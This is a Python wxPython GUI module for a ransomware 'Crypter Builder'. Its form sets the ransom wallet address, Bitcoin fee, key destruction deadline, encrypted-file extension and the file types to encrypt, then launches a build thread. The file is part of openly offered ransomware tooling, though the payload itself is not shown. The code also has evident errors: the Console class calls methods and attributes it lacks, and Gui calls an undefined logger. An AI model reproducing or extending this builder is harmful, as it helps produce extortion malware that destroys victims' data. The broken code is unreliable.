# -*- coding: utf-8 -*-
'''
@summary: Crypter Builder: Provides GUI functionality
@author: MLS
'''

# Import libs
import wx
from wx.lib.pubsub import setuparg1
from wx.lib.pubsub import pub as Publisher
import datetime

# Import package modules
from .BuilderGuiAbsBase import MainFrame
from .Base import *
from .BuilderThread import BuilderThread

###############
## GUI CLASS ##
###############
class Gui(MainFrame):
    '''
    @summary: Provides a GUI object
    '''
    
    def __init__(self, config_dict):
        '''
        @summary: Constructor
        @param config_dict: The build configuration, if present
        '''
        self.language = DEFAULT_LANGUAGE
        self.__builder = None
        
        # Init super - MainFrame
        MainFrame.__init__( self, parent=None )
        self.console = Console(self.ConsoleTextCtrl)
        
        # Set initial event handlers
        self.set_events()
        
        # Update configuration
        self.update_config_values(config_dict)
        
    
    def update_config_values(self, config_dict):
        '''
        @summary: Updates the GUI field values with those in the config_dict
        @param config_dict: The config dict loaded from the build config file, if any
        '''
        
        # Parse values
        if config_dict:
            # Builder Language
            if "builder_language" in config_dict:
                if unicode(config_dict["builder_language"]) not in SUPPORTED_LANGUAGES:
                    self.BuilderLanguageChoice.SetString(0, DEFAULT_LANGUAGE)
                else:
                    self.BuilderLanguageChoice.SetString(0, config_dict["builder_language"])
                    if config_dict["builder_language"] != self.language:
                        self.update_language(None, language=config_dict["builder_language"])
            # Major Version
            if "maj_version" in config_dict:
                self.MajorVersionTextCtrl.SetValue(config_dict["maj_version"])
            # Minor Version
            if "min_version" in config_dict:
                self.MinorVersionTextCtrl.SetValue(config_dict["min_version"])
            # Filename
            if "filename" in config_dict:
                self.FilenameTextCtrl.SetValue(config_dict["filename"])
            # Extension
            if "extension" in config_dict:
                self.ExtensionTextCtrl.SetValue(config_dict["extension"])
            # PyInstaller AES Key
            if "pyinstaller_aes_key" in config_dict:
                self.PyInstallerAesKeyTextCtrl.SetValue(config_dict["pyinstaller_aes_key"].upper())
            # PyInstaller AES Key
            if "pyinstaller_aes_key" in config_dict:
                self.PyInstallerAesKeyTextCtrl.SetValue(config_dict["pyinstaller_aes_key"].upper())
            # Icon File
            if "icon_file" in config_dict:
                self.IconFilePicker.SetPath(config_dict["icon_file"])
            # Encrypted File Extension
            if "encrypted_file_extension" in config_dict:
                self.EncryptedFileExtensionTextCtrl.SetValue(config_dict["encrypted_file_extension"])
            # Wallet Address
            if "wallet_address" in config_dict:
                self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
            # Bitcoin Fee
            if "bitcoin_fee" in config_dict:
                self.BitcoinFeeTextCtrl.SetValue(config_dict["bitcoin_fee"])
            # Key Destruction time
            if "key_destruction_time" in config_dict:
                self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
            # Max file size to encrypt
            if "max_file_size_to_encrypt" in config_dict:
                self.MaxFileSizeTextCtrl.SetValue(config_dict["max_file_size_to_encrypt"])
            # Filetypes to encrypt
            if "filetypes_to_encrypt" in config_dict:
                filetypes = ",".join(config_dict["filetypes_to_encrypt"])
                self.FiletypesToEncryptTextCtrl.SetValue(filetypes)
            
    
    def set_events(self):
        '''
        @summary: Set GUI events for the various controls
        '''
        
        # Catch Language choice changes
        self.Bind(wx.EVT_CHOICE, self.update_language, self.BuilderLanguageChoice)

        # BUILD button
        self.Bind(wx.EVT_BUTTON, self.__start_build, self.BuildButton)
        
        
    def update_language(self, event, language=None):
        '''
        @summary: Updates the Builder GUI language to the selected choice
        @param language: The language to change the form to. This is only provided when
        called directly, and not through a wx Event
        @todo: Finish when support for multiple languages has been enabled for the Builder
        '''
        
        if not event:
            if language == "English":
                self.language = "English"
                #print("Changing language to English")
                
    def __get_timestamp(self):
        '''
        @summary: Return timestamp string
        '''
        
        current_time = datetime.datetime.now()
        time_output = "%s-%s-%s %s:%s:%s" % (
            current_time.year,
            current_time.month if current_time.month >= 10 else "0%s" % current_time.month,
            current_time.day if current_time.day >= 10 else "0%s" % current_time.day,
            current_time.hour if current_time.hour >= 10 else "0%s" % current_time.hour,
            current_time.minute if current_time.minute >= 10 else "0%s" % current_time.minute,
            current_time.second if current_time.second >= 10 else "0%s" % current_time.second
            )
                
        return time_output


    def __update_progress(self, msg):
        '''
        @summary: Updates the GUI with the build progress and status
        @todo: Create logger method
        '''
            
        #self.ConsoleTextCtrl.AppendText((msg.data))
        self.__console_log(_class=msg.data["_class"], msg=msg.data["msg"])
        
        # TODO If it's the thread update before the thread ends, set the Button back to "Build"
        

    def __stop_build(self, event):
        '''
        @summary: Method to terminate the build process
        '''
        
        if self.__builder and self.__builder.is_in_progress():
            self.__builder.stop()

        
    def __start_build(self, event):
        '''
        @summary: Launches the validate and build processes
        '''
        user_input_dict = {}
        
        # Read the form contents and pass to Builder validate
        # Major Version
        user_input_dict["maj_version"] = self.MajorVersionTextCtrl.GetValue()
        # Minor Version
        user_input_dict["min_version"] = self.MinorVersionTextCtrl.GetValue()
        # Filename
        user_input_dict["filename"] = self.FilenameTextCtrl.GetValue()
        # Filename
        user_input_dict["extension"] = self.ExtensionTextCtrl.GetValue()
        # PyInstaller AES Key
        user_input_dict["pyinstaller_aes_key"] = self.PyInstallerAesKeyTextCtrl.GetValue()
        # PyInstaller AES Key
        user_input_dict["icon_file"] = self.IconFilePicker.GetPath()
        # Encrypted File Extension
        user_input_dict["encrypted_file_extension"] = self.EncryptedFileExtensionTextCtrl.GetValue()
        # Wallet Address
        user_input_dict["wallet_address"] = self.WalletAddressTextCtrl.GetValue()
        # Bitcoin Fee
        user_input_dict["bitcoin_fee"] = self.BitcoinFeeTextCtrl.GetValue()
        # Key Destruction Time
        user_input_dict["key_destruction_time"] = self.KeyDestructionTimeTextCtrl.GetValue()
        # Max file size to encrypt
        user_input_dict["max_file_size_to_encrypt"] = self.MaxFileSizeTextCtrl.GetValue()
        # Max file size to encrypt
        user_input_dict["filetypes_to_encrypt"] = self.FiletypesToEncryptTextCtrl.GetValue()
        
        # TODO Clear the Console
        
        
        # Create listener and Launch the Build thread
        Publisher.subscribe(self.__update_progress, "update")
        self.__builder = BuilderThread(user_input_dict)
        
        # Change GUI BUILD button to STOP and bind to Stop method
        self.BuildButton.SetLabel("STOP")
        self.Bind(wx.EVT_BUTTON, self.__stop_build, self.BuildButton)
        
        
###################
## CONSOLE CLASS ##
###################
class Console():
    '''
    @summary: Provides an interface for the GUI Console window
    '''
    
    def __init__(self, console):
        '''
        @summary: Constructor
        @param console: Handle to the wxPython console TextCtrl
        '''
        self.__console_box = console


    def log(self, _class=None, msg=None):
        '''
        @summary: Logs output to the Console
        @todo: What params to pass here? ... is there another way of doing this? can we inherit from this...
        There may be a better way so that everyone has access to this class and it's methods
        '''
        
        # Add the message to the Console box
        self.ConsoleTextCtrl.AppendText("[%s]: %s: %s\n" % (self.__get_timestamp(),
                                                            _class, 
                                                            msg))

            
    
    
    
    
    
    